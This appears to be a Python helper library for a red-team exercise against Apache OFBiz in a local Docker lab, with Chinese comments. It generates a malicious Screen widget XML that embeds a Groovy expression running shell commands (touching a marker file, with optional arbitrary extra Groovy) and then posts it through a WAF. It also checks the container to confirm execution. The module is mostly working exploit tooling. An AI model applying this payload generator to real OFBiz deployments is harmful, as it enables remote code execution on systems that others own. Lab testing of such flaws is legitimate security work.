# -*- coding: utf-8 -*-
"""RT-2 轮公共库：载荷生成 + 发包 + 真值核查辅助。"""
import io
import os
import subprocess

import requests
import urllib3

urllib3.disable_warnings()

HERE = os.path.dirname(os.path.abspath(__file__))
LAB = os.path.normpath(os.path.join(HERE, "..", ".."))
WWW = os.path.join(LAB, "infrastructure", "www")
WAF = "https://127.0.0.1:18381"

S = requests.Session()
S.trust_env = False
S.verify = False
S.headers["User-Agent"] = "Mozilla/5.0"


def xml_payload(screen_name, marker, fname, extra_groovy=None):
    """生成恶意 Screen XML：actions 里 touch 标记文件，可选额外 groovy。"""
    g = "'touch /tmp/%s'.execute()" % marker
    if extra_groovy:
        g += ";" + extra_groovy
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<screens xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n'
        '        xmlns="http://ofbiz.apache.org/Widget-Screen"'
        ' xsi:schemaLocation="http://ofbiz.apache.org/Widget-Screen'
        ' http://ofbiz.apache.org/dtds/widget-screen.xsd">\n'
        '    <screen name="%s">\n'
        '        <section>\n'
        '            <actions>\n'
        '                <set value="${groovy:%s}"/>\n'
        '            </actions>\n'
        '        </section>\n'
        '    </screen>\n'
        '</screens>\n' % (screen_name, g)
    )
    path = os.path.join(WWW, "payloads", fname)
    io.open(path, "w", encoding="utf-8").write(xml)
    return fname


def post(uri, data=None, params_in_query=None, files=None, timeout=30,
         base=WAF, allow_redirects=False):
    url = base + uri
    if params_in_query is not None:
        from urllib.parse import urlencode
        url += "?" + urlencode(params_in_query)
    return S.post(url, data=data, files=files, timeout=timeout,
                  allow_redirects=allow_redirects)


def truth():
    """ofbiz /tmp 新标记 + infra 近期访问日志。"""
    r = subprocess.run(["docker", "exec", "multi-round-lab-ofbiz-1", "ls", "-l",
                        "--full-time", "/tmp"], capture_output=True, text=True)
    print("== ofbiz /tmp ==")
    print(r.stdout.strip())
    r2 = subprocess.run(["docker", "logs", "multi-round-lab-infra-1", "--since", "5m"],
                        capture_output=True, text=True)
    print("== infra log(5m) ==")
    print(r2.stdout.strip()[-3000:])
    print(r2.stderr.strip()[-2000:])


def http_probe(path):
    """用宿主 curl 探测 infra 上的文件是否存在（对照用）。"""
    r = subprocess.run(["curl", "-s", "--noproxy", "*", "-o", "NUL",
                        "-w", "%{http_code}", "--max-time", "8",
                        "http://127.0.0.1:19080" + path], capture_output=True, text=True)
    return r.stdout.strip()
